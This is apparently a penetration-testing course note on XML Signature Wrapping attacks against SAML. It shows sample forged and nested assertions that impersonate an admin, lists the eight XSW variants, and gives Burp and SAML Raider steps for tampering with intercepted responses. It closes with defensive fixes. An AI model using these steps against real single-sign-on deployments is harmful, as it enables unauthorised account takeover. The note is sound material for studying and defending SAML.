---
tags: [vapt, saml, advanced]
difficulty: advanced
module: "20 - SAML"
topic: "20.03 XML Signature Wrapping (XSW) Attacks"
portswigger_labs: []
---

# 20.03 — XML Signature Wrapping (XSW) Attacks

## The Core Idea

```
XML SIGNATURE WRAPPING (XSW):
  GOAL: Get SP to process attacker-controlled content while signature is valid
  
  KEY INSIGHT:
  SAML signatures use XML Digital Signature
  XML Signature signs a specific element (identified by ID attribute)
  
  The SP does TWO things:
  1. VALIDATE: signature is valid (verifies signed element)
  2. PROCESS: reads user attributes from the assertion
  
  XSW TRICK: 
  These two things look at DIFFERENT XML elements!
  
  → Signature is valid for ELEMENT A (the original)
  → SP processes data from ELEMENT B (the attacker's forged copy)
  → Signature = valid! Processed data = attacker's!
```

---

## How XML Signatures Work

```xml
ORIGINAL SIGNED ASSERTION:
  <saml:Assertion ID="_abc123">
    <ds:Signature>
      <ds:Reference URI="#_abc123">  ← signs the element with ID "_abc123"
        <ds:DigestValue>HASH_OF_ASSERTION</ds:DigestValue>
      </ds:Reference>
      <ds:SignatureValue>VALID_SIGNATURE</ds:SignatureValue>
    </ds:Signature>
    <saml:NameID>attacker@evil.com</saml:NameID>
    <!-- ... -->
  </saml:Assertion>

PROBLEM:
  When SP verifies: "Does the signature cover ID=_abc123?" → YES → valid!
  When SP processes: "What element contains the NameID?" 
  → It might use XPath like: //saml:Assertion[1] (first assertion found!)
  → Or: //saml:Subject/saml:NameID (finds ANY NameID!)
  
  IF SP uses XPath/path instead of ID-based lookup:
  → Attacker can add a SECOND element to confuse the SP!
```

---

## XSW Variant 1: Double Assertion

```xml
ORIGINAL (legitimate, signed):
<samlp:Response>
  <saml:Assertion ID="_legit">
    <ds:Signature>
      <ds:Reference URI="#_legit">VALID_SIGNATURE</ds:Reference>
    </ds:Signature>
    <saml:NameID>attacker@evil.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

MODIFIED (XSW — add unsigned assertion before/after):
<samlp:Response>
  <!-- ATTACKER'S FORGED ASSERTION (no signature!) -->
  <saml:Assertion ID="_forged">
    <saml:NameID>admin@company.com</saml:NameID>  ← ATTACKER WANTS THIS!
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:Assertion>
  
  <!-- ORIGINAL SIGNED ASSERTION (valid signature, but now moved) -->
  <saml:Assertion ID="_legit">
    <ds:Signature>
      <ds:Reference URI="#_legit">VALID_SIGNATURE</ds:Reference>
    </ds:Signature>
    <saml:NameID>attacker@evil.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

IF SP PROCESSES FIRST ASSERTION FOUND:
  → Processes _forged (no signature needed for it!)
  → But validates _legit (valid signature!) → passes validation!
  → Attacker authenticated as admin@company.com!
```

---

## XSW Variant 2: Nested Assertion (Most Common)

```xml
MODIFIED (Signature wrapping — inject inside signed element's subtree):
<samlp:Response>
  <saml:Assertion ID="_legit">  ← signed element (valid signature)
    <ds:Signature>
      <ds:Reference URI="#_legit">VALID_SIGNATURE</ds:Reference>
    </ds:Signature>
    
    <!-- INJECT ATTACKER'S ASSERTION AS CHILD OF SIGNED ELEMENT: -->
    <saml:Assertion ID="_injected">
      <saml:NameID>admin@company.com</saml:NameID>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:Assertion>
    
    <saml:NameID>attacker@evil.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

IF SP PROCESSES INNERMOST ASSERTION:
  → Finds _injected first (more specific XPath)
  → Valid signature covers _legit (which CONTAINS _injected)
  → Might consider _injected as "signed" because its parent is signed
  → Attacker = admin!
```

---

## 8 XSW Variants (XSW1-XSW8)

```
RESEARCHERS IDENTIFIED 8 MAIN PATTERNS:
  Each exploits different SP parsing behavior

XSW1: Duplicate assertion, attacker's before original in Response
XSW2: Duplicate assertion, attacker's after original in Response  
XSW3: Attacker assertion as sibling of signed Response
XSW4: Attacker assertion inside Extensions element of Response
XSW5: Replace signed assertion with attacker's, move signed to Extensions
XSW6: Attacker assertion inside signed assertion (nested)
XSW7: Attacker assertion inside signed assertion's Subject
XSW8: Attacker assertion in different namespace

SAML RAIDER AUTOMATES ALL 8:
  Click "XSW" tab → select variant → resend → check if logged in as modified user
```

---

## Practical Attack with SAML Raider

```
STEP-BY-STEP WITH BURP + SAML RAIDER:

1. INSTALL SAML RAIDER:
   Burp → Extender → BApp Store → SAML Raider → Install

2. INTERCEPT SAML FLOW:
   Configure scope for target
   Start OAuth/SAML login flow
   Intercept the POST /saml/acs request in Burp

3. SAML RAIDER AUTO-DETECTS:
   Bottom tab: "SAML Raider" appears when SAMLResponse found
   Shows decoded XML
   
4. MODIFY NAMEID:
   In SAML Raider → find NameID
   Change: john.doe@company.com → admin@company.com
   
5. APPLY XSW ATTACK:
   Click "XSW" tab
   Select XSW variant (try XSW1 first, then others)
   Click "Apply XSW"
   
6. RESIGN (if needed):
   If you have the IdP's key (lab/testing scenario)
   Or: testing if SP accepts without valid signature
   
7. FORWARD MODIFIED REQUEST:
   Forward → observe response
   Did the app log you in as admin?

MANUAL TEST:
  If no Burp Raider, decode → modify XML → re-encode base64:
  python3 -c "
  import base64
  xml = open('modified.xml', 'r').read()
  print(base64.b64encode(xml.encode()).decode())
  "
```

---

## Why XSW Works

```
ROOT CAUSE: AMBIGUOUS XML PROCESSING

SP implementation does:
  1. Find signature → verify → points to element with ID=X → hash check → VALID
  2. Find user identity → use XPath or first-element logic → might find Y!
  
  These two steps look at DIFFERENT elements!
  
COMMON VULNERABLE PATTERNS:
  // VULNERABLE: uses first element
  assertion = doc.getElementsByTagNameNS(SAML_NS, 'Assertion')[0]
  
  // VULNERABLE: searches for ANY NameID
  nameId = doc.evaluate("//NameID", doc, ...).stringValue
  
  // SECURE: finds signed element by ID, uses only THAT
  signedId = getSignedReferenceId(signature)
  assertion = getElementById(doc, signedId)
  nameId = assertion.querySelector('NameID').textContent
```

---

## Fix

```
PREVENTING XSW:

1. VERIFY SIGNATURE BEFORE ACCESSING ANY ATTRIBUTES:
   Never process content from assertion before validating signature

2. USE SIGNED ID TO LOCATE ASSERTION:
   After signature validation → get the ID that was signed
   → Use getElementById(signedId) to get the assertion
   → ONLY process data from THAT element

3. REJECT MULTIPLE ASSERTIONS:
   Legitimate SAML responses have ONE assertion
   Multiple assertions → reject unless multiple assertions expected + all signed

4. STRICT SCHEMA VALIDATION:
   Validate XML against SAML schema BEFORE processing
   Schema defines what structure is expected
   Invalid structure → reject

5. USE TESTED SAML LIBRARIES:
   Don't implement SAML parsing yourself!
   python3-saml, onelogin-saml2 (patched for XSW)
   java: OpenSAML (with XSW protections)
   
   But: verify the library version is patched!
   Many old versions were vulnerable to XSW!

6. VERIFY SIGNATURE ON ASSERTION (not just Response):
   <samlp:Response> can be unsigned, <saml:Assertion> must be signed
   Check the assertion-level signature specifically
```

---

## Related Notes
- [[02 - SAML Assertion Structure]] — understanding XML structure
- [[06 - SAML Comment Injection]] — simpler bypass technique
- [[08 - SAML Signature Bypass (none algorithm)]] — removing signature
- [[09 - SAML to Account Takeover]] — full attack chains
- [[10 - Defense — Strict Schema Validation, Signed Assertions]] — fixes
